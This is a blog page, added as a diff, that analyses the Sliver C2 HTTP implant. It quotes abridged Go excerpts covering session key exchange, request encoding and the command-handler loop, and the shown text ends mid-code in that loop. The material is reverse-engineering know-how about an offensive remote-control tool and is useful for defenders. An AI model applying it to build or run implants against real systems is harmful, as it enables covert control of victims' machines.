@@ -1,0 +1,387 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+		
+		<link href="../_app/immutable/assets/0.Dlb7pXDV.css" rel="stylesheet">
+		<link href="../_app/immutable/assets/4.CimdS63P.css" rel="stylesheet">
+		<link rel="modulepreload" href="../_app/immutable/entry/start.ouMra9AW.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/Bds1QhS9.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/DCFcRc6v.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/BqHloRb4.js">
+		<link rel="modulepreload" href="../_app/immutable/entry/app.CO75G284.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/C6U3RdpY.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/Dwf-VV-B.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/CBZjZzat.js">
+		<link rel="modulepreload" href="../_app/immutable/nodes/0.CLhogo2J.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/D4n077k-.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/DhnXOQm4.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/CW9wjobI.js">
+		<link rel="modulepreload" href="../_app/immutable/nodes/4.Cf4XbhDB.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/jRw7-Y13.js"><!--[--><!--]--><title>Analysis of the Sliver C2 HTTP Implant</title>
+	</head>
+	<body data-sveltekit-preload-data="hover" style="background-color:  #E9E9DF;">
+		<div style="display: contents"><!--[--><!--[--><!----><div class="site-header svelte-8v83zk"><h1 id="site-title" class="svelte-8v83zk"> Anoth3r Site</h1> <h1 class="blink svelte-8v83zk">_</h1></div> <hr class="hr-top svelte-8v83zk"> <div class="svelte-8v83zk"><ul class="nav-bar svelte-8v83zk"><li class="svelte-8v83zk"><a href="/" class="svelte-8v83zk">Home</a></li> <li class="svelte-8v83zk"><a href="/about" class="svelte-8v83zk">About</a></li> <li class="svelte-8v83zk"><a href="https://github.com/fl1gg" class="svelte-8v83zk">Github</a></li> <li class="svelte-8v83zk"><a href="/contact" class="svelte-8v83zk">Contact</a></li></ul></div> <br class="svelte-8v83zk"><!----> <!----><div class="articles svelte-1oy2dsc"><div class="header svelte-1oy2dsc"><h1 class="title svelte-1oy2dsc">Analysis of the Sliver C2 HTTP Implant</h1> <p class="subtitle svelte-1oy2dsc">Unpacking the sliver1.6 c2 http implant to document how it works and the traffic it sends</p></div> <div class="tags svelte-1oy2dsc"><!--[--><span class="tag svelte-1oy2dsc">#sliver</span><span class="tag svelte-1oy2dsc">#c2</span><span class="tag svelte-1oy2dsc">#reversing</span><!--]--></div> <br class="svelte-1oy2dsc"> <hr class="svelte-1oy2dsc"> <div id="page" class="svelte-1oy2dsc"><!----><h2>Summary</h2> <p>In this article I want to take apart the sliver http implant with the following objectives:</p> <ul><li>Document the communication between the sliver server and an implant</li> <li>Explain how a sliver is handling requests from the sliver server</li> <li>Look at the encoding of messages across the connection</li></ul> <p>To do that we are going to look at how a connection is established and maintained by the implant.</p> <h2>Analysis</h2> <h3>Establishing a Connection</h3> <p>The first thing we need to understand the way sliver implants establish a secure channel with the server.</p> <p>All silver code (silvers are implants and beacons) is located in the <code>sliver/implant/sliver</code> directory. Sliver’s code uses a lot of abstraction as all types of connections (http(s), dns, mtls, etc..) use the same boilerplate. Let’s break down the connection establishing code for an http connection. While we could skip to the relevant functions, I think it is important to understand how functions are interacting with each other and passing objects in the implants.</p> <p>First we check out the <code>sliver.go</code> file and the main function. The important code here tells us that if the sliver is considered an implant we run <code>sessionStartup()</code>.</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#8B949E">// sliver/implant/sliver/sliver.go</span></span>
+<span class="line"><span style="color:#FF7B72">func</span><span style="color:#D2A8FF"> main</span><span style="color:#E6EDF3">() &#123;</span></span>
+<span class="line"><span style="color:#FF7B72">    ...</span></span>
+<span class="line"><span style="color:#8B949E">	// &#123;&#123;if .Config.IsBeacon&#125;&#125;</span></span>
+<span class="line"><span style="color:#D2A8FF">	beaconStartup</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#8B949E">	// &#123;&#123;else&#125;&#125; ------- IsBeacon/IsSession -------</span></span>
+<span class="line"><span style="color:#D2A8FF">	sessionStartup</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#8B949E">	// &#123;&#123;end&#125;&#125;</span></span>
+<span class="line"><span style="color:#FF7B72">    ...</span></span>
+<span class="line"><span style="color:#E6EDF3">&#125;</span></span></code></pre><!----> <p><code>SessionStartup()</code> is using transports (a sliver library) to start a connection loop. It is then starting a Main Loop on the connection. We will come back to the main loop later.</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#8B949E">// sliver/implant/sliver/sliver.go</span></span>
+<span class="line"><span style="color:#FF7B72">import</span><span style="color:#E6EDF3"> (</span></span>
+<span class="line"><span style="color:#A5D6FF">    "</span><span style="color:#FFA657">github.com/bishopfox/sliver/implant/sliver/transports</span><span style="color:#A5D6FF">"</span></span>
+<span class="line"><span style="color:#E6EDF3">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">...</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">func</span><span style="color:#D2A8FF"> sessionStartup</span><span style="color:#E6EDF3">() &#123;</span></span>
+<span class="line"><span style="color:#FF7B72">    ...</span></span>
+<span class="line"><span style="color:#E6EDF3">    connections </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> transports.</span><span style="color:#D2A8FF">StartConnectionLoop</span><span style="color:#E6EDF3">(abort)</span></span>
+<span class="line"><span style="color:#FF7B72">    for</span><span style="color:#E6EDF3"> connection </span><span style="color:#FF7B72">:=</span><span style="color:#FF7B72"> range</span><span style="color:#E6EDF3"> connections &#123;</span></span>
+<span class="line"><span style="color:#FF7B72">		if</span><span style="color:#E6EDF3"> connection </span><span style="color:#FF7B72">!=</span><span style="color:#79C0FF"> nil</span><span style="color:#E6EDF3"> &#123;</span></span>
+<span class="line"><span style="color:#E6EDF3">			err </span><span style="color:#FF7B72">:=</span><span style="color:#D2A8FF"> sessionMainLoop</span><span style="color:#E6EDF3">(connection)</span></span>
+<span class="line"><span style="color:#FF7B72">    ...</span></span>
+<span class="line"><span style="color:#E6EDF3">&#125;</span></span></code></pre><!----> <p>This takes us to the <code>StartConnectionLoop()</code> function. This section is simply creating an http connection using a uri that is generated by the configuration settings of the implant.</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#8B949E">// sliver/implant/sliver/transports/session.go</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">func</span><span style="color:#D2A8FF"> StartConnectionLoop</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">abort</span><span style="color:#FF7B72"> &#x3C;-chan</span><span style="color:#FF7B72"> struct</span><span style="color:#E6EDF3">&#123;&#125;, </span><span style="color:#FFA657">temporaryC2</span><span style="color:#FF7B72"> ...</span><span style="color:#FF7B72">string</span><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">&#x3C;-chan</span><span style="color:#FF7B72"> *</span><span style="color:#FFA657">Connection</span><span style="color:#E6EDF3"> &#123;</span></span>
+<span class="line"><span style="color:#FF7B72">	...</span></span>
+<span class="line"><span style="color:#E6EDF3">	c2Generator </span><span style="color:#FF7B72">:=</span><span style="color:#D2A8FF"> C2Generator</span><span style="color:#E6EDF3">(innerAbort, temporaryC2</span><span style="color:#FF7B72">...</span><span style="color:#E6EDF3">) </span><span style="color:#8B949E">// the generator simply returns a uri that can be used to connect to a server</span></span>
+<span class="line"><span style="color:#FF7B72">	...</span></span>
+<span class="line"><span style="color:#FF7B72">	for</span><span style="color:#E6EDF3"> uri </span><span style="color:#FF7B72">:=</span><span style="color:#FF7B72"> range</span><span style="color:#E6EDF3"> c2Generator &#123;</span></span>
+<span class="line"><span style="color:#FF7B72">			var</span><span style="color:#E6EDF3"> err </span><span style="color:#FF7B72">error</span></span>
+<span class="line"><span style="color:#FF7B72">    ...</span></span>
+<span class="line"><span style="color:#FF7B72">			case</span><span style="color:#A5D6FF"> "http"</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#8B949E">				// *** HTTP ***</span></span>
+<span class="line"><span style="color:#8B949E">				// &#123;&#123;if .Config.IncludeHTTP&#125;&#125;</span></span>
+<span class="line"><span style="color:#E6EDF3">				connection, err </span><span style="color:#FF7B72">=</span><span style="color:#D2A8FF"> httpConnect</span><span style="color:#E6EDF3">(uri)</span></span>
+<span class="line"><span style="color:#FF7B72">				if</span><span style="color:#E6EDF3"> err </span><span style="color:#FF7B72">!=</span><span style="color:#79C0FF"> nil</span><span style="color:#E6EDF3"> &#123;</span></span>
+<span class="line"><span style="color:#8B949E">					// &#123;&#123;if .Config.Debug&#125;&#125;</span></span>
+<span class="line"><span style="color:#E6EDF3">					log.</span><span style="color:#D2A8FF">Printf</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"[</span><span style="color:#FF7B72">%s</span><span style="color:#A5D6FF">] Connection failed </span><span style="color:#FF7B72">%s</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">, uri.Scheme, err)</span></span>
+<span class="line"><span style="color:#8B949E">					// &#123;&#123;end&#125;&#125;</span></span>
+<span class="line"><span style="color:#FF7B72">					continue</span></span>
+<span class="line"><span style="color:#E6EDF3">				&#125;</span></span>
+<span class="line"><span style="color:#8B949E">				// &#123;&#123;end&#125;&#125; - IncludeHTTP</span></span>
+<span class="line"><span style="color:#FF7B72">    ...</span></span>
+<span class="line"><span style="color:#E6EDF3">&#125;</span></span></code></pre><!----> <p>This httpConnect function is then calling <code>httpclient.HTTPStartSession()</code>. Note this is attaching the initialization to the connection.Start function, not actually running it (yet).</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#8B949E">// sliver/implant/sliver/transports/session.go</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">func</span><span style="color:#D2A8FF"> httpConnect</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">uri</span><span style="color:#FF7B72"> *</span><span style="color:#FFA657">url</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">URL</span><span style="color:#E6EDF3">) (</span><span style="color:#FF7B72">*</span><span style="color:#FFA657">Connection</span><span style="color:#E6EDF3">, </span><span style="color:#FF7B72">error</span><span style="color:#E6EDF3">) &#123;</span></span>
+<span class="line"><span style="color:#FF7B72">    ...</span></span>
+<span class="line"><span style="color:#E6EDF3">	connection.Start </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> func</span><span style="color:#E6EDF3">() </span><span style="color:#FF7B72">error</span><span style="color:#E6EDF3"> &#123;</span></span>
+<span class="line"><span style="color:#8B949E">		// &#123;&#123;if .Config.Debug&#125;&#125;</span></span>
+<span class="line"><span style="color:#E6EDF3">		log.</span><span style="color:#D2A8FF">Printf</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"Connecting -> http(s)://</span><span style="color:#FF7B72">%s</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">, uri.Host)</span></span>
+<span class="line"><span style="color:#8B949E">		// &#123;&#123;end&#125;&#125;</span></span>
+<span class="line"><span style="color:#E6EDF3">		opts </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> httpclient.</span><span style="color:#D2A8FF">ParseHTTPOptions</span><span style="color:#E6EDF3">(uri)</span></span>
+<span class="line"><span style="color:#E6EDF3">		client, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> httpclient.</span><span style="color:#D2A8FF">HTTPStartSession</span><span style="color:#E6EDF3">(uri.Host, uri.Path, opts)</span></span>
+<span class="line"><span style="color:#FF7B72">    ...</span></span></code></pre><!----> <p>So we finally get to the http client specific code. The <code>HTTPStartSession()</code> code does some stuff and then calls the <code>client.SessionInit()</code>.</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#8B949E">// sliver/implant/sliver/transports/httpclient/httpclient.go</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">func</span><span style="color:#D2A8FF"> HTTPStartSession</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">address</span><span style="color:#FF7B72"> string</span><span style="color:#E6EDF3">, </span><span style="color:#FFA657">pathPrefix</span><span style="color:#FF7B72"> string</span><span style="color:#E6EDF3">, </span><span style="color:#FFA657">opts</span><span style="color:#FF7B72"> *</span><span style="color:#FFA657">HTTPOptions</span><span style="color:#E6EDF3">) (</span><span style="color:#FF7B72">*</span><span style="color:#FFA657">SliverHTTPClient</span><span style="color:#E6EDF3">, </span><span style="color:#FF7B72">error</span><span style="color:#E6EDF3">) &#123;</span></span>
+<span class="line"><span style="color:#FF7B72">    ...</span></span>
+<span class="line"><span style="color:#E6EDF3">    err </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> client.</span><span style="color:#D2A8FF">SessionInit</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#FF7B72">    ...</span></span>
+<span class="line"><span style="color:#E6EDF3">&#125;</span></span></code></pre><!----> <p>Finally, we get to the initialization code. This function is incredibly interesting. It creates the symmetric key that will be used to encrypt the session. There also appear to be Age keys in the implant config, which are asymmetric and handle initializing the handshake: <a href="https://github.com/FiloSottile/age" rel="nofollow">https://github.com/FiloSottile/age</a>. I have added some comments about what this function is doing.</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#8B949E">// sliver/implant/sliver/transports/httpclient/httpclient.go</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">func</span><span style="color:#E6EDF3"> (</span><span style="color:#FFA657">s </span><span style="color:#FF7B72">*</span><span style="color:#FFA657">SliverHTTPClient</span><span style="color:#E6EDF3">) </span><span style="color:#D2A8FF">SessionInit</span><span style="color:#E6EDF3">() </span><span style="color:#FF7B72">error</span><span style="color:#E6EDF3"> &#123;</span></span>
+<span class="line"><span style="color:#E6EDF3">	sKey </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> cryptography.</span><span style="color:#D2A8FF">RandomSymmetricKey</span><span style="color:#E6EDF3">() </span><span style="color:#8B949E">// create a random Symmetric Key</span></span>
+<span class="line"><span style="color:#E6EDF3">	s.SessionCtx </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> cryptography.</span><span style="color:#D2A8FF">NewCipherContext</span><span style="color:#E6EDF3">(sKey)  </span><span style="color:#8B949E">// set the key for the context of the implant</span></span>
+<span class="line"><span style="color:#E6EDF3">	httpSessionInit </span><span style="color:#FF7B72">:=</span><span style="color:#FF7B72"> &#x26;</span><span style="color:#FFA657">pb</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">HTTPSessionInit</span><span style="color:#E6EDF3">&#123;Key: sKey[:]&#125; </span></span>
+<span class="line"><span style="color:#E6EDF3">	data, _ </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> proto.</span><span style="color:#D2A8FF">Marshal</span><span style="color:#E6EDF3">(httpSessionInit)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">	encryptedSessionInit, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> cryptography.</span><span style="color:#D2A8FF">AgeKeyExToServer</span><span style="color:#E6EDF3">(data)   </span><span style="color:#8B949E">// encrypt the symmetric key with the server's public age key</span></span>
+<span class="line"><span style="color:#FF7B72">	if</span><span style="color:#E6EDF3"> err </span><span style="color:#FF7B72">!=</span><span style="color:#79C0FF"> nil</span><span style="color:#E6EDF3"> &#123;</span></span>
+<span class="line"><span style="color:#8B949E">		// &#123;&#123;if .Config.Debug&#125;&#125;</span></span>
+<span class="line"><span style="color:#E6EDF3">		log.</span><span style="color:#D2A8FF">Printf</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"Nacl encrypt failed </span><span style="color:#FF7B72">%v</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">, err)</span></span>
+<span class="line"><span style="color:#8B949E">		// &#123;&#123;end&#125;&#125;</span></span>
+<span class="line"><span style="color:#FF7B72">		return</span><span style="color:#E6EDF3"> err</span></span>
+<span class="line"><span style="color:#E6EDF3">	&#125;</span></span>
+<span class="line"><span style="color:#E6EDF3">	err </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> s.</span><span style="color:#D2A8FF">establishSessionID</span><span style="color:#E6EDF3">(encryptedSessionInit) </span><span style="color:#8B949E">// establish a session with this encrypted key</span></span>
+<span class="line"><span style="color:#FF7B72">	if</span><span style="color:#E6EDF3"> err </span><span style="color:#FF7B72">!=</span><span style="color:#79C0FF"> nil</span><span style="color:#E6EDF3"> &#123;</span></span>
+<span class="line"><span style="color:#FF7B72">		return</span><span style="color:#E6EDF3"> err</span></span>
+<span class="line"><span style="color:#E6EDF3">	&#125;</span></span>
+<span class="line"><span style="color:#FF7B72">	return</span><span style="color:#79C0FF"> nil</span></span>
+<span class="line"><span style="color:#E6EDF3">&#125;</span></span></code></pre><!----> <p>The <code>establishSessionID()</code> function is taking our encrypted session key and creating a request with an encoder (such as gzip, json, etc…). I have stripped all the error checking and debug so we can look at the meat of what this function is doing.</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#8B949E">// sliver/implant/sliver/transports/httpclient/httpclient.go</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">func</span><span style="color:#E6EDF3"> (</span><span style="color:#FFA657">s </span><span style="color:#FF7B72">*</span><span style="color:#FFA657">SliverHTTPClient</span><span style="color:#E6EDF3">) </span><span style="color:#D2A8FF">establishSessionID</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">sessionInit</span><span style="color:#E6EDF3"> []</span><span style="color:#FF7B72">byte</span><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">error</span><span style="color:#E6EDF3"> &#123;</span></span>
+<span class="line"><span style="color:#E6EDF3">	nonce, encoder </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> encoders.</span><span style="color:#D2A8FF">RandomEncoder</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">	payload, _ </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> encoder.</span><span style="color:#D2A8FF">Encode</span><span style="color:#E6EDF3">(sessionInit)</span></span>
+<span class="line"><span style="color:#E6EDF3">	reqBody </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> bytes.</span><span style="color:#D2A8FF">NewReader</span><span style="color:#E6EDF3">(payload)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">	uri </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> s.</span><span style="color:#D2A8FF">startSessionURL</span><span style="color:#E6EDF3">() </span><span style="color:#8B949E">//get the url that starts a session, this is specific and server will reject otherwise</span></span>
+<span class="line"><span style="color:#E6EDF3">	s.</span><span style="color:#D2A8FF">NonceQueryArgument</span><span style="color:#E6EDF3">(uri, nonce) </span><span style="color:#8B949E">//add a nonce to the url to prevent duplicate request attacks</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">	req </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> s.</span><span style="color:#D2A8FF">newHTTPRequest</span><span style="color:#E6EDF3">(http.MethodPost, uri, reqBody) </span><span style="color:#8B949E">//create a request</span></span>
+<span class="line"><span style="color:#FF7B72">	...</span></span>
+<span class="line"><span style="color:#E6EDF3">	resp, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> s.driver.</span><span style="color:#D2A8FF">Do</span><span style="color:#E6EDF3">(req) </span><span style="color:#8B949E">// send the request</span></span>
+<span class="line"><span style="color:#FF7B72">	...</span></span>
+<span class="line"><span style="color:#E6EDF3">	respData, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> io.</span><span style="color:#D2A8FF">ReadAll</span><span style="color:#E6EDF3">(resp.Body) </span><span style="color:#8B949E">//get the response</span></span>
+<span class="line"><span style="color:#FF7B72">	...</span></span>
+<span class="line"><span style="color:#E6EDF3">	data, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> encoder.</span><span style="color:#D2A8FF">Decode</span><span style="color:#E6EDF3">(respData) </span><span style="color:#8B949E">//decode the response</span></span>
+<span class="line"><span style="color:#FF7B72">	...</span></span>
+<span class="line"><span style="color:#E6EDF3">	sessionID, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> s.SessionCtx.</span><span style="color:#D2A8FF">Decrypt</span><span style="color:#E6EDF3">(data) </span><span style="color:#8B949E">//decrypt the decoding</span></span>
+<span class="line"><span style="color:#FF7B72">	...</span></span>
+<span class="line"><span style="color:#E6EDF3">	s.SessionID </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> string</span><span style="color:#E6EDF3">(sessionID) </span><span style="color:#8B949E">//set our session id</span></span>
+<span class="line"><span style="color:#FF7B72">	...</span></span>
+<span class="line"><span style="color:#FF7B72">	return</span><span style="color:#79C0FF"> nil</span></span>
+<span class="line"><span style="color:#E6EDF3">&#125;</span></span></code></pre><!----> <p>At this point a connection has been established and the sliver/implant is communicating with the server.</p> <h3>Implant Main Loop</h3> <p>Now we get to the main loop which we mentioned previously. I again have stripped some of the error code to focus on the program flow that we care about for our http implant.</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#8B949E">//implant/sliver/sliver.go</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">func</span><span style="color:#D2A8FF"> sessionMainLoop</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">connection</span><span style="color:#FF7B72"> *</span><span style="color:#FFA657">transports</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Connection</span><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">error</span><span style="color:#E6EDF3"> &#123;</span></span>
+<span class="line"><span style="color:#8B949E">	//ideally a malicious plugin would request information necessary to mimic a legitimate plugin here</span></span>
+<span class="line"><span style="color:#FF7B72">	...</span></span>
+<span class="line"><span style="color:#E6EDF3">	err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> connection.</span><span style="color:#D2A8FF">Start</span><span style="color:#E6EDF3">() </span><span style="color:#8B949E">// this is preforming the session id establishing that is covered in the above section</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">	...</span></span>
+<span class="line"><span style="color:#FF7B72">	defer</span><span style="color:#E6EDF3"> connection.</span><span style="color:#D2A8FF">Stop</span><span style="color:#E6EDF3">() </span><span style="color:#8B949E">//stop the connection when we are done</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">	...</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">	register </span><span style="color:#FF7B72">:=</span><span style="color:#D2A8FF"> registerSliver</span><span style="color:#E6EDF3">() </span><span style="color:#8B949E">//get registration information</span></span>
+<span class="line"><span style="color:#E6EDF3">	register.ActiveC2 </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> connection.</span><span style="color:#D2A8FF">URL</span><span style="color:#E6EDF3">() </span></span>
+<span class="line"><span style="color:#E6EDF3">	register.ProxyURL </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> connection.</span><span style="color:#D2A8FF">ProxyURL</span><span style="color:#E6EDF3">() </span></span>
+<span class="line"><span style="color:#E6EDF3">	connection.Send </span><span style="color:#FF7B72">&#x3C;-</span><span style="color:#D2A8FF"> wrapEnvelope</span><span style="color:#E6EDF3">(sliverpb.MsgRegister, register) </span><span style="color:#8B949E">// Send registration information</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">	pivotHandlers </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> handlers.</span><span style="color:#D2A8FF">GetPivotHandlers</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#E6EDF3">	tunHandlers </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> handlers.</span><span style="color:#D2A8FF">GetTunnelHandlers</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#E6EDF3">	sysHandlers </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> handlers.</span><span style="color:#D2A8FF">GetSystemHandlers</span><span style="color:#E6EDF3">() </span><span style="color:#8B949E">//handler to execute commands</span></span>
+<span class="line"><span style="color:#E6EDF3">	specialHandlers </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> handlers.</span><span style="color:#D2A8FF">GetKillHandlers</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#E6EDF3">	rportfwdHandlers </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> handlers.</span><span style="color:#D2A8FF">GetRportFwdHandlers</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">	for</span><span style="color:#E6EDF3"> envelope </span><span style="color:#FF7B72">:=</span><span style="color:#FF7B72"> range</span><span style="color:#E6EDF3"> connection.Recv &#123; </span><span style="color:#8B949E">//for each message we receive, apply the correct handler</span></span>
+<span class="line"><span style="color:#E6EDF3">		envelope </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> envelope</span></span>
+<span class="line"><span style="color:#FF7B72">		if</span><span style="color:#E6EDF3"> _, ok </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> specialHandlers[envelope.Type]; ok &#123;</span></span>
+<span class="line"><span style="color:#FF7B72">			...</span></span>
+<span class="line"><span style="color:#FF7B72">			return</span><span style="color:#E6EDF3"> ErrTerminate</span></span>
+<span class="line"><span style="color:#E6EDF3">		&#125; </span><span style="color:#FF7B72">else</span><span style="color:#FF7B72"> if</span><span style="color:#E6EDF3"> handler, ok </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> pivotHandlers[envelope.Type]; ok &#123; </span></span>
+<span class="line"><span style="color:#FF7B72">			...</span></span>
+<span class="line"><span style="color:#FF7B72">			go</span><span style="color:#D2A8FF"> handler</span><span style="color:#E6EDF3">(envelope, connection)</span></span>
+<span class="line"><span style="color:#E6EDF3">		&#125; </span><span style="color:#FF7B72">else</span><span style="color:#FF7B72"> if</span><span style="color:#E6EDF3"> handler, ok </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> rportfwdHandlers[envelope.Type]; ok &#123;</span></span>
+<span class="line"><span style="color:#FF7B72">			...</span></span>
+<span class="line"><span style="color:#FF7B72">			go</span><span style="color:#D2A8FF"> handler</span><span style="color:#E6EDF3">(envelope, connection)</span></span>
+<span class="line"><span style="color:#E6EDF3">		&#125; </span><span style="color:#FF7B72">else</span><span style="color:#FF7B72"> if</span><span style="color:#E6EDF3"> handler, ok </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> sysHandlers[envelope.Type]; ok &#123;</span></span>
+<span class="line"><span style="color:#8B949E">			// Beware, here be dragons.</span></span>
+<span class="line"><span style="color:#8B949E">			// This is required for the specific case of token impersonation:</span></span>
+<span class="line"><span style="color:#8B949E">			// Since goroutines don't always execute in the same thread, but ImpersonateLoggedOnUser</span></span>
+<span class="line"><span style="color:#8B949E">			// only applies the token to the calling thread, we need to call it before every task.</span></span>
+<span class="line"><span style="color:#8B949E">			// It's fucking gross to do that here, but I could not come with a better solution.</span></span>
+<span class="line"><span style="color:#FF7B72">			...</span></span>
+<span class="line"><span style="color:#8B949E">			// &#123;&#123;if eq .Config.GOOS "windows" &#125;&#125;</span></span>
+<span class="line"><span style="color:#FF7B72">			go</span><span style="color:#E6EDF3"> handlers.</span><span style="color:#D2A8FF">WrapperHandler</span><span style="color:#E6EDF3">(handler, envelope.Data, </span><span style="color:#FF7B72">func</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">data</span><span style="color:#E6EDF3"> []</span><span style="color:#FF7B72">byte</span><span style="color:#E6EDF3">, </span><span style="color:#FFA657">err</span><span style="color:#FF7B72"> error</span><span style="color:#E6EDF3">) &#123;</span></span>
+<span class="line"><span style="color:#E6EDF3">				connection.Send </span><span style="color:#FF7B72">&#x3C;-</span><span style="color:#FF7B72"> &#x26;</span><span style="color:#FFA657">sliverpb</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Envelope</span><span style="color:#E6EDF3">&#123;</span></span>
+<span class="line"><span style="color:#E6EDF3">					ID:   envelope.ID,</span></span>
+<span class="line"><span style="color:#E6EDF3">					Data: data,</span></span>
+<span class="line"><span style="color:#E6EDF3">				&#125;</span></span>
+<span class="line"><span style="color:#E6EDF3">			&#125;)</span></span>
+<span class="line"><span style="color:#8B949E">			// &#123;&#123;else&#125;&#125;</span></span>
+<span class="line"><span style="color:#FF7B72">			go</span><span style="color:#D2A8FF"> handler</span><span style="color:#E6EDF3">(envelope.Data, </span><span style="color:#FF7B72">func</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">data</span><span style="color:#E6EDF3"> []</span><span style="color:#FF7B72">byte</span><span style="color:#E6EDF3">, </span><span style="color:#FFA657">err</span><span style="color:#FF7B72"> error</span><span style="color:#E6EDF3">) &#123;</span></span>
